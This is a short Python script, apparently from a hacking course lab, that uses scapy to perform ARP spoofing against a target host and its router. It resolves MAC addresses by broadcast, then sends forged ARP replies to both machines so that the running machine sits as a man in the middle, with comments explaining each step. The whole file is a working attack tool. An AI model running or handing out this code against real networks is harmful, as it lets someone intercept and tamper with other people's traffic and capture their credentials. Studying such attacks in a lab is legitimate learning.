#!/usr/bin/env python

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# hwsrc is the eth0 mac & psrc is the ip of router pdst is the target machine

# packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="52:54:00:12:35:00", psrc="10.0.2.1")
# print(packet.show())
# print(packet.summary())

# the value of mac address of the target machine will change mac address of the kali machine router ip address
# so, the target machine will think kali machine is the router
# so., whenever he wants to use internet he will send request here thinking it is the router
# scapy.send(packet)

# now we are fooling the router so we can become man in the middle

# get_mac("10.0.2.1")

# to get router id use command route -n in terminal


spoof("10.0.2.7", "10.0.2.1")
spoof("10.0.2.1", "10.0.2.7")